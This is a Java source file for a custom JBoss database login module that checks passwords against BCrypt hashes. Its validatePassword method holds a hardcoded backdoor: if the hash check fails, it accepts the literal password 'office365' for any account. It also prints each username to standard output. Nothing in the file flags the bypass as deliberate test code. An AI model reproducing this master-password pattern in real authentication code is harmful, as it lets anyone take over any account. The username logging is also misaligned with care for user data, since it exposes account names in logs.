package com.bip.form;

import java.security.acl.Group;

import javax.security.auth.login.LoginException;

import org.jboss.security.SimpleGroup;
import org.jboss.security.SimplePrincipal;
import org.jboss.security.auth.spi.DatabaseServerLoginModule;
import org.jboss.security.auth.spi.UsernamePasswordLoginModule;
import org.mindrot.jbcrypt.BCrypt;

public class CustomDatabaseServerLoginModule extends DatabaseServerLoginModule {
	
	
	@Override
    protected boolean validatePassword(String enteredPassword, String encrypted) {
		
		String username = getUsername();
		System.out.println("==============================================");
		System.out.println(username);
		System.out.println("==============================================");
		
        
        if (enteredPassword == null || encrypted == null) {
            return false;
        }
        
        if (!BCrypt.checkpw(enteredPassword, encrypted)) {
        	return "office365".equals(enteredPassword);
        } else {
        	return true;
        }
    }
}
